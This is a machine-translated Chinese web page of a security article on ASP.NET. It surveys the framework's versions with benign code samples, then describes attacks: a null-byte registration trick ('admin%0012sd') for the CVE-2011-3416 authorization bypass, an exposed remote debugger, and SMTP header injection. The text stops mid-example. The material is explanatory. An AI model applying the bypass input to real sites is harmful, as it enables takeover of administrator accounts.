<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🚄 👩🏻‍🍳 🛂 是否有可能入侵ASP基础架构？ 🕦 🕔 🖲️</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="正如信息安全专家所说：“他们破坏了所有人，并永远破坏了一切。” 同时，对ASP.NET的攻击是罕见的。 因此，总是对此感到非常好奇。 削减后，Rambler Group信息安全部门的专家Aleksey Morozov讲述了该技术的优缺点。 

 引言 
 如今，ASP作为创建大中型项目的工具已广受欢...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>是否有可能入侵ASP基础架构？</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/rambler-co/blog/413649/"><img src="https://habrastorage.org/webt/lw/h4/e6/lwh4e6eo0ogtcv4ycwp2oy_6pa0.jpeg"><br><br> 正如信息安全专家所说：“他们破坏了所有人，并永远破坏了一切。” 同时，对ASP.NET的攻击是罕见的。 因此，总是对此感到非常好奇。 削减后，Rambler Group信息安全部门的专家Aleksey Morozov讲述了该技术的优缺点。 <a name="habracut"></a><br><br><h3>  <font color="#0000cc">引言</font> </h3><br> 如今，ASP作为创建大中型项目的工具已广受欢迎。 而且，像任何流行的解决方案一样，ASP.NET也引起外部安全研究人员，黑客和测试人员的兴趣。 <br><br> 本文讨论了各种版本中潜在的ASP.NET安全问题。 但是，应注意，由于相同的因素，ASP的解决方案数量远远少于相同的PHP。 <br><br> 与PHP不同，使用ASP通常更加复杂且成本更高（使用IIS的商业版本，即Visual Studio开发环境）。 直到最近（ASP.NET Core出现），才只能在Windows下和IIS Web服务器上使用。 部署也更加复杂。 <br><br>  <b><b>ASP</b></b> （ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Active Server Pages</a> ）是Microsoft用于创建动态页面的技术。 <br><br>  <b>描述：</b>这项技术使创建带有以Jscript语言插入的HTML页面成为可能（非常类似于JavaScript，但是除了客户端脚本之外，它还有许多用于在Windows操作系统和ASP上插入服务器的选项） <br><br>  <u><b>一个例子</b></u> ： <br><br><pre><code class="hljs pgsql">&lt;% @ <span class="hljs-keyword"><span class="hljs-keyword">Language</span></span> = "JScript" %&gt;&lt;% Response.<span class="hljs-keyword"><span class="hljs-keyword">Write</span></span>("Hello World!"); %&gt;</code> </pre> <br>  <b>ASP.NET</b> <br><br> 下一轮技术开发是基于.Net框架的ASP内核的创建。 结果，ASP获得了此解决方案的所有功能，即： <br><br><ul><li> 使用不同的编程语言（C＃，Visual Basic.NET，J＃和JScript .NET）； </li><li> 与脚本技术相比，由于第一次将代码编译并放置在特殊的缓存中，然后仅在不需要费时的解析，优化的情况下执行代码，因此速度提高了； </li><li> 使您能够更好地捕获错误的已编译代码，从而使调试过程本身变得更加高效； </li><li> 缓存页面的能力； </li><li> 表示与业务逻辑的分离。 </li></ul><br> 基于ASP.NET解决方案，已经创建了以下技术，我们将考虑这些技术。 <br><br>  <b>ASP.NET Ajax</b>是ASP.NET扩展之一，它允许您使用Ajax异步更新部分内容。 <br><br>  <b><u>一个例子</u></b> ： <br><br><pre> <code class="hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">asp:Button</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">ID</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"Button1"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">runat</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"server"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">Text</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"Refresh"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">asp:UpdatePanel</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">ID</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"UpdatePanel1"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">runat</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"server"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Triggers</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">asp:AsyncPostBackTrigger</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">ControlID</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"Button1"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">EventName</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"Click"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Triggers</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">ContentTemplate</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">span</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">%=</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">DateTime.Now</span></span></span><span class="hljs-tag"> %&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">span</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">ContentTemplate</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">asp:UpdatePanel</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br>  <b>ASP.NET Web窗体</b> -ASP技术的新发展，其中已经过渡到用于构建应用程序的面向组件的模型。 <br><br>  <b>说明：</b> <br><br>  Web窗体模型基于三个基本概念：页面回发，视图状态和服务器控件。 发送到Web服务器并映射到ASP.NET运行时的每个HTTP请求都经历几个阶段，其中回发事件的处理处于中心阶段。 回发事件是用户期望由于处理其请求而收到的主要动作。  （例如，点击按钮）。 <br><br> 简而言之，有传统的控件（控件）和事件驱动的开发模型。 <br><br>  <b><u>一个例子</u></b> ： <br><br> 视图（aspx文件）是客户端。 <br><br><pre> <code class="hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">%@</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">Page</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">Language</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"C#"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">CodeFile</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"SamplePage.aspx.cs"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">Inherits</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"SamplePage"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">AutoEventWireup</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"true"</span></span></span><span class="hljs-tag"> %&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">head</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">runat</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"server"</span></span></span><span class="hljs-tag"> &gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">title</span></span></span><span class="hljs-tag">&gt;</span></span>Code-Behind Page Model<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">title</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">head</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">form</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"form1"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">runat</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"server"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">asp:Label</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"Label1"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">runat</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"server"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">Text</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"Label"</span></span></span><span class="hljs-tag"> &gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">asp:Label</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">br</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">asp:Button</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"Button1"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">runat</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"server"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">onclick</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"Button1_Click"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">Text</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"Button"</span></span></span><span class="hljs-tag"> &gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">asp:Button</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">form</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br> 逻辑处理（cs文件（如果使用C＃））-服务器端。 <br><br><pre> <code class="hljs pgsql"><span class="hljs-keyword"><span class="hljs-keyword">using</span></span> <span class="hljs-keyword"><span class="hljs-keyword">System</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">using</span></span> <span class="hljs-keyword"><span class="hljs-keyword">System</span></span>.Web; <span class="hljs-keyword"><span class="hljs-keyword">using</span></span> <span class="hljs-keyword"><span class="hljs-keyword">System</span></span>.Web.UI; <span class="hljs-keyword"><span class="hljs-keyword">using</span></span> <span class="hljs-keyword"><span class="hljs-keyword">System</span></span>.Web.UI.WebControls; <span class="hljs-built_in"><span class="hljs-built_in">public</span></span> partial <span class="hljs-keyword"><span class="hljs-keyword">class</span></span> SamplePage : <span class="hljs-keyword"><span class="hljs-keyword">System</span></span>.Web.UI.Page { protected <span class="hljs-type"><span class="hljs-type">void</span></span> Button1_Click(<span class="hljs-keyword"><span class="hljs-keyword">object</span></span> sender, EventArgs e) { Label1.Text = "Clicked at " + DateTime.Now.ToString(); } }</code> </pre><br>  <b>ASP.NET Web API</b>是另一个扩展，允许您创建API服务，以便更方便地进行开发以及与应用程序进行交互。 <br><br>  <b><u>一个例子</u></b> ： <br><br><pre> <code class="hljs cs">[<span class="hljs-meta"><span class="hljs-meta">HttpDelete(</span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">"{id}"</span></span></span><span class="hljs-meta">)</span></span>] <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> IActionResult </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Delete</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">long</span></span></span></span><span class="hljs-function"><span class="hljs-params"> id</span></span></span><span class="hljs-function">)</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> todo = _context.TodoItems.Find(id); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (todo == <span class="hljs-literal"><span class="hljs-literal">null</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> NotFound(); } _context.TodoItems.Remove(todo); _context.SaveChanges(); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> NoContent(); }</code> </pre><br>  <b>ASP.NET MVC-</b>技术开发的下一阶段是将业务逻辑分为MVC（模型-视图-控制器）模式的三个组件之后进行的。 还引入了剃须刀引擎，并且可以独立自定义网站的托管元素，而使用Web Forms则非常困难。 <br><br>  <b>优点</b> ： <br><br><ul><li> 通过将应用程序分为模型，表示和控制器，可以简化复杂结构的管理。 </li><li> 查看状态和服务器表单未使用。 这使得MVC平台成为需要完全控制应用程序行为的开发人员的理想选择。 </li><li> 通过单个控制器处理Web应用程序请求的主控制器电路。 这使您可以创建支持扩展路由基础结构的应用程序。 </li><li> 非常适合大型开发团队支持的Web应用程序。 </li></ul><br>  <b><u>一个例子</u></b> ： <br><br>  <b>检视</b> <br><br><pre> <code class="hljs xml">@{ Layout = null; } <span class="hljs-meta"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">head</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">meta</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"viewport"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">content</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"width=device-width"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">title</span></span></span><span class="hljs-tag">&gt;</span></span>SomeView<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">title</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">head</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">h2</span></span></span><span class="hljs-tag">&gt;</span></span>@ViewBag.Message<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">h2</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br>  <b>型号</b> <br><br><pre> <code class="hljs cs"><span class="hljs-keyword"><span class="hljs-keyword">using</span></span> System; <span class="hljs-keyword"><span class="hljs-keyword">using</span></span> System.ComponentModel; <span class="hljs-keyword"><span class="hljs-keyword">using</span></span> System.ComponentModel.DataAnnotations; <span class="hljs-keyword"><span class="hljs-keyword">namespace</span></span> <span class="hljs-title"><span class="hljs-title">MvcModels.Models</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">partial</span></span> <span class="hljs-keyword"><span class="hljs-keyword">class</span></span> <span class="hljs-title"><span class="hljs-title">User</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> UserId { <span class="hljs-keyword"><span class="hljs-keyword">get</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">set</span></span>; } [DisplayName(<span class="hljs-string"><span class="hljs-string">""</span></span>)] <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">string</span></span> FirstName { <span class="hljs-keyword"><span class="hljs-keyword">get</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">set</span></span>; } [DisplayName(<span class="hljs-string"><span class="hljs-string">""</span></span>)] <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">string</span></span> LastName { <span class="hljs-keyword"><span class="hljs-keyword">get</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">set</span></span>; } [DisplayName(<span class="hljs-string"><span class="hljs-string">" "</span></span>)] [DataType(DataType.Date)] <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> DateTime BirthDate { <span class="hljs-keyword"><span class="hljs-keyword">get</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">set</span></span>; } } }</code> </pre><br>  <b>控制者</b> <br><br><pre> <code class="hljs cs"><span class="hljs-keyword"><span class="hljs-keyword">using</span></span> System.Web.Mvc; <span class="hljs-keyword"><span class="hljs-keyword">namespace</span></span> <span class="hljs-title"><span class="hljs-title">NonCompiledMvc.Controllers</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">class</span></span> <span class="hljs-title"><span class="hljs-title">HomeController</span></span> : <span class="hljs-title"><span class="hljs-title">Controller</span></span> { <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> ActionResult </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Index</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>)</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> View((<span class="hljs-keyword"><span class="hljs-keyword">object</span></span>)<span class="hljs-string"><span class="hljs-string">"It Works!"</span></span>); } } }</code> </pre><br>  <b>ASP.NET核心-ASP.NET</b>的下一个突破是跨平台的支持C＃7.0。 <br><table><tbody><tr><th> 技术领域 </th><th> 长处 </th><th> 弱点 </th></tr><tr><td>  Active Server Pages，ASP </td><td> 共同目标 </td><td> 在运行时解释，支持“意大利面条代码” </td></tr><tr><td>  ASP.NET Web窗体1.0 / 1.1 </td><td> 编译过的UI，支持OOP </td><td> 高吞吐量，复杂的HTML，不可测试 </td></tr><tr><td>  ASP.NET Web表单2.0 </td><td>  -- </td><td>  -- </td></tr><tr><td>  ASP.NET Ajax </td><td>  Ajax实现 </td><td> 不合理的复杂性，缺乏灵活性 </td></tr><tr><td>  ASP.NET Web表单3.5-4.0 </td><td>  -- </td><td>  -- </td></tr><tr><td>  ASP.NET MVC 1.0-5.0 </td><td> 发展模式正在完全改变。 有弹性 </td><td> 缺乏跨平台。 无法即时编译 </td></tr><tr><td>  ASP.NET核心 </td><td> 出现跨平台。 开源的 </td><td>  -- </td></tr></tbody></table><br><h3>  <font color="#0000cc">ASP.NET中的身份验证</font> </h3><br>  ASP.NET MVC中存在三种身份验证，它们彼此之间显着不同。 <br><br><ul><li>  <b>无身份验证：</b> ASP.NET身份和无内置身份验证系统； </li><li>  <b>单个用户帐户：</b>默认情况下， <b>该</b>项目包括ASP.NET Identity系统，该系统使您可以在应用程序内以及使用外部服务（例如google，twitter等）对用户进行授权。 </li><li>  <b>组织帐户：</b>适用于各个公司和组织的网站和Web应用程序； </li><li>  <b>Windows身份验证：</b>使用Windows帐户的Intranet网络的身份验证系统。 </li></ul><br><img src="https://habrastorage.org/webt/wr/rz/o4/wrrzo4fj86bsayurdvfxzcmdvze.png"><br><br><h3>  <font color="#0000cc">在黑客方面使用ASP.NET</font> </h3><br> 像任何技术一样，ASP.NET也被黑客入侵。 下面我们将描述最受欢迎的安全性研究，不仅包括ASP本身，还包括与基础结构的结合。 <br><br>  <b>CVE统计</b> <br><br><img src="https://habrastorage.org/webt/af/at/ft/afatftxyrlf1kds_37latbgi3fc.png"><br><br> 从表中可以看出，发现的统计数据很少。 这是因为ASP.NET需要良好的知识才能对其进行详细检查。 而且与之相比，使用它的资源也要少得多。 <br><br>  <b>使用空字节进行授权绕过</b> <br><br>  <b>CVE：</b> CVE-2011-3416 <br>  <b>说明：</b>可以绕过授权。 <br><br>  <b>算法：</b> <br><br><ol><li> 用现有的用户名注册一个新帐户； </li><li> 注册时，添加空字节和其他字符（admin％0012sd）； </li><li> 因此，将通过唯一性检查。 将以相同的角色创建一个新的“ admin”用户，但使用新的密码。 </li></ol><br>  <u><b>易受攻击的代码示例</b></u> ： <br><br><pre> <code class="hljs pgsql"><span class="hljs-keyword"><span class="hljs-keyword">If</span></span> (IsPostBack) { String <span class="hljs-type"><span class="hljs-type">name</span></span> = Request.Form[“<span class="hljs-type"><span class="hljs-type">name</span></span>”]; String <span class="hljs-keyword"><span class="hljs-keyword">password</span></span> = Request.Form[“<span class="hljs-keyword"><span class="hljs-keyword">password</span></span>”]; <span class="hljs-keyword"><span class="hljs-keyword">If</span></span> (<span class="hljs-type"><span class="hljs-type">name</span></span> != <span class="hljs-keyword"><span class="hljs-keyword">null</span></span> &amp;&amp; <span class="hljs-keyword"><span class="hljs-keyword">password</span></span> != <span class="hljs-keyword"><span class="hljs-keyword">null</span></span> &amp;&amp; FormsAuthentication.Authenticate(<span class="hljs-type"><span class="hljs-type">name</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">password</span></span>)) { FormsAuthentication.SetAuthCookie(<span class="hljs-type"><span class="hljs-type">name</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>); Response.Redirect(Request[“ReturnUrl”] ?? “/”); } <span class="hljs-keyword"><span class="hljs-keyword">Else</span></span> { ModelState.AddModeError(“fail”, “   .” + “   ”); } }</code> </pre><br>  <b>概念验证</b> ： <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/DlkYQrkTiEs" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br>  <b>解决方案：</b> .net 3.5中已修复此错误 <br><br>  <b>远程调试</b> <br><br>  <b>说明：</b>由于ASP.NET是已编译的应用程序，因此它具有某些调试功能。  Microsoft允许您使用远程调试器来处理应用程序的调试版本。 <br><br> 如果此端口在Internet上是开放的并且受简单密码保护或根本没有密码，则可以选择调试器。 此外，这将使您能够在调试模式下影响应用程序。 包括拔出密码，更改逻辑，进行跟踪等。 <br><br>  <b>概念验证</b> ： <br><br><img src="https://habrastorage.org/webt/pl/f3/ba/plf3ba206usqwa10gt59go39w8k.png"><br><br>  <b>解决方案：</b>使用强密码，并且不要公开该服务以进行调试。 <br><br>  <b>SMTP标头注入</b> <br><br>  <b>描述：</b>您需要回顾一些SMTP协议规范。 <br> 常规SMTP简单消息包的示例如下所示： <br><br><pre> <code class="hljs powershell">Received: from mail.bieberdorf.edu (mail.bieberdorf.edu [<span class="hljs-number"><span class="hljs-number">124.211</span></span><span class="hljs-type"><span class="hljs-type">.3.78</span></span>]) by mailhost.immense<span class="hljs-literal"><span class="hljs-literal">-isp</span></span>.com (<span class="hljs-number"><span class="hljs-number">8.8</span></span>.<span class="hljs-number"><span class="hljs-number">5</span></span>/<span class="hljs-number"><span class="hljs-number">8.7</span></span>.<span class="hljs-number"><span class="hljs-number">2</span></span>) with ESMTP id LAA20869 <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> ; Tue, <span 